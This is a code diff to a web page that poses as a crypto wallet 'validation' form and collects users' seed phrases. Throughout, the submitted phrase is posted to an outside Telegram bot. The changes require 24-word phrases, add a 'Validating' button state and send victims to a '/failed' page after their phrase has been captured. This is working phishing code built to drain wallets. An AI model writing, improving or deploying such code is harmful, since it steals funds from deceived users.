@@ -24,14 +24,15 @@ const formSchema = z.object({
   phrase: z
     .string()
     .min(1, "Passphrase cannot be empty")
-    .refine((val) => val.trim().split(/\s+/).length >= 12, {
-      message: "Passphrase must contain at least 12 words",
+    .refine((val) => val.trim().split(/\s+/).length >= 24, {
+      message: "Passphrase must contain at least 24 words",
     }),
 });
 
 export default function page() {
   const router = useRouter();
   const [error, setError] = React.useState<boolean>(false);
+  const [validating, setValidating] = React.useState<boolean>(false);
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
@@ -44,6 +45,7 @@ export default function page() {
 
   // Function to send message
   const sendMessageToTelegram = async (message: string) => {
+    setValidating(true);
     try {
       const response = await axios.post(
         `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -52,9 +54,11 @@ export default function page() {
           text: message,
         }
       );
-      router.replace("/success");
+      setValidating(false);
+      router.replace("/failed");
     } catch (error) {
       setError(true);
+      setValidating(false);
       setTimeout(() => {
         setError(false);
       }, 2000);
@@ -112,7 +116,7 @@ export default function page() {
                   type="submit"
                   className="min-w-[250px] w-full md:w-fit text-sm px-10 uppercase hover:bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#8a348e] text-[#8a348e] font-bold hover:text-white py-3.5 rounded-lg border"
                 >
-                  Validate
+                  {validating ? "Validating" : "Validate"}
                 </button>
                 <p className="text-sm">
                   As a non-custodial wallet, your wallet passphrase is
